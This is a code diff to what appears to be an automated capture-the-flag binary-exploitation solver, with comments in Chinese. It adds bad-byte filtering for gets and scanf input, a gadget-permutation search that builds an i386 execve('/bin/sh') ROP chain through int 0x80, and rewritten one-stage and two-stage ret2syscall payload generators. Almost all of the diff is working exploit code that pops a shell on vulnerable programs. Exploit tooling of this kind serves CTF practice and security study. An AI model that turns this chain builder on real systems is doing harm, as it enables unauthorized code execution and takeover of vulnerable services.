@@ -75,6 +75,50 @@ def _align(ch: Challenge, f: Facts, on: bool) -> bytes:
     return ch.p64(ret) if ret else ch.p64(0x400000 + 1)  # 万一没有 ret 就用无效值试一次
 
 
+BAD_BYTES = {
+    "gets": b"\n",
+    "fgets": b"\n",
+    "scanf": b" \t\n\x0b\x0c\r",
+    "__isoc99_scanf": b" \t\n\x0b\x0c\r",
+}
+
+
+def _bad(ch: Challenge, sink: str) -> bytes:
+    return BAD_BYTES.get(sink, b"")
+
+
+def _pack_ok(ch: Challenge, val: int, sink: str) -> bool:
+    bad = _bad(ch, sink)
+    if not bad:
+        return True
+    raw = val.to_bytes(ch.wordsize, "little")
+    return not any(b in raw for b in bad)
+
+
+def _pick_addr(ch: Challenge, f: Facts, sink: str, key: str, fallback: int = None) -> Optional[int]:
+    """在同类 gadget 里挑一个打包后不含坏字节的地址。"""
+    cands = list(f.gadget_alts.get(key) or [])
+    if fallback:
+        cands.append(fallback)
+    for a in cands:
+        if _pack_ok(ch, a, sink):
+            return a
+    return cands[0] if cands else fallback
+
+
+def _pick_val(ch: Challenge, sink: str, val: int) -> Optional[int]:
+    return val if _pack_ok(ch, val, sink) else None
+
+
+def _clean_bss(ch: Challenge, sink: str, base: int, span: int = 0x800) -> Optional[int]:
+    """在 bss 范围内挑一个打包后不含坏字节的地址。"""
+    for delta in range(0, span, ch.wordsize):
+        addr = base + delta
+        if _pack_ok(ch, addr, sink):
+            return addr
+    return base
+
+
 def _pad(ch: Challenge, off: int) -> bytes:
     return b"A" * off
 
@@ -342,6 +386,75 @@ def s_shellcode(ch: Challenge, f: Facts) -> Iterable[Plan]:
                        f"shellcode -> {hex(target)} off={v.offset} size={len(blob)}")
 
 
+
+GADGET_REGS = {
+    "pop_eax": ["eax"],
+    "pop_ebx": ["ebx"],
+    "pop_ecx": ["ecx"],
+    "pop_edx": ["edx"],
+    "pop_ecx_ebx": ["ecx", "ebx"],
+    "pop_ebx_edx": ["ebx", "edx"],
+    "pop_edx_ecx": ["edx", "ecx"],
+}
+
+
+def _i386_syscall_chain(ch: Challenge, f: Facts, sink: str, binsh: int) -> Optional[bytes]:
+    """拼一条 execve("/bin/sh",0,0) 的 i386 ROP 链。
+
+    需要 eax=11 / ebx=binsh / ecx=0 / edx=0；gadget 只需能覆盖这四个寄存器，
+    且地址与取值打包后不能含坏字节（gets 遇 0x0a 会截断）。
+    """
+    want = {"eax": 11, "ebx": binsh, "ecx": 0, "edx": 0}
+    int80 = _pick_addr(ch, f, sink, "int80", f.gadgets.get("int80"))
+    if not int80 or not _pack_ok(ch, int80, sink):
+        return None
+
+    usable = {}
+    for key, regs in GADGET_REGS.items():
+        if ch.elf.bits == 64:
+            continue
+        addr = _pick_addr(ch, f, sink, key, f.gadgets.get(key))
+        if addr and _pack_ok(ch, addr, sink):
+            usable[key] = (addr, regs)
+    if not usable:
+        return None
+
+    import itertools
+    keys = list(usable)
+    best = None
+    for n in (1, 2, 3, 4):
+        for combo in itertools.permutations(keys, n):
+            covered = {}
+            for k in combo:
+                for r in usable[k][1]:
+                    covered[r] = k
+            if set(covered) != set(want):
+                continue
+            # 组合里每个 gadget 的寄存器都必须最终被正确赋值：由后往前覆盖检查
+            ok = True
+            for reg, val in want.items():
+                if reg not in covered:
+                    ok = False
+                    break
+            if not ok:
+                continue
+            # 构造 payload（同一寄存器可能被多次赋值，最后一次为准）
+            blob = b""
+            for k in combo:
+                addr, regs = usable[k]
+                blob += ch.p32(addr)
+                for r in regs:
+                    blob += ch.p32(want[r])
+            blob += ch.p32(int80)
+            if any(b in blob for b in _bad(ch, sink)):
+                continue
+            best = (combo, blob)
+            break
+        if best:
+            break
+    return best[1] if best else None
+
+
 # --------------------------------------------------------------------------- 7. 32 位 ret2syscall
 def s_ret2syscall(ch: Challenge, f: Facts) -> Iterable[Plan]:
     if ch.elf.bits != 32 or f.binsh is None:
@@ -362,15 +475,11 @@ def s_ret2syscall(ch: Challenge, f: Facts) -> Iterable[Plan]:
         return
 
     for off, sink in _offsets(ch, f):
-        for setup in setups:
-            payload = b"A" * off + ch.p32(g["pop_eax"]) + ch.p32(11)
-            for item in setup:
-                payload += ch.p32(g[item[0]])
-                for val in item[1:]:
-                    payload += ch.p32(val)
-            payload += ch.p32(g["pop_edx"]) + ch.p32(0) + ch.p32(g["int80"])
-            yield Plan("ret2syscall", [payload + _term(sink)],
-                       f"execve('/bin/sh') int80 off={off} setup={setup[0][0]}")
+        chain = _i386_syscall_chain(ch, f, sink, f.binsh)
+        if not chain:
+            continue
+        yield Plan("ret2syscall", [b"A" * off + chain + _term(sink)],
+                   f"execve int80 off={off}")
 
 
 def s_ret2syscall_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
@@ -392,18 +501,19 @@ def s_ret2syscall_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
     if "pop_ecx" in g and "pop_ebx" in g:
         setups.append([("pop_ecx", 0), ("pop_ebx", bss)])
     for off, sink in _offsets(ch, f):
-        for setup in setups:
-            stage1 = (b"A" * off + ch.p32(writer.target) + ch.p32(main) + ch.p32(bss))
-            chain = ch.p32(g["pop_eax"]) + ch.p32(11)
-            for item in setup:
-                chain += ch.p32(g[item[0]])
-                for val in item[1:]:
-                    chain += ch.p32(val)
-            chain += ch.p32(g["pop_edx"]) + ch.p32(0) + ch.p32(g["int80"])
-            stage2 = b"A" * off + chain
-            sends = [stage1 + _term(sink), b"/bin/sh\x00\n", stage2 + _term(sink)]
-            yield Plan("ret2sys_write", sends,
-                       f"gets({hex(bss)}) -> main -> execve off={off}")
+        clean_bss = _clean_bss(ch, sink, bss)
+        if not clean_bss:
+            continue
+        chain = _i386_syscall_chain(ch, f, sink, clean_bss)
+        if not chain:
+            continue
+        if not _pack_ok(ch, writer.target, sink) or not _pack_ok(ch, main, sink):
+            continue
+        stage1 = b"A" * off + ch.p32(writer.target) + ch.p32(main) + ch.p32(clean_bss)
+        stage2 = b"A" * off + chain
+        sends = [stage1 + _term(sink), b"/bin/sh\x00\n", stage2 + _term(sink)]
+        yield Plan("ret2sys_write", sends,
+                   f"gets({hex(clean_bss)}) -> main -> execve off={off}")
 
 
 # --------------------------------------------------------------------------- 7b. canary + fmt 泄漏 + ret2libc
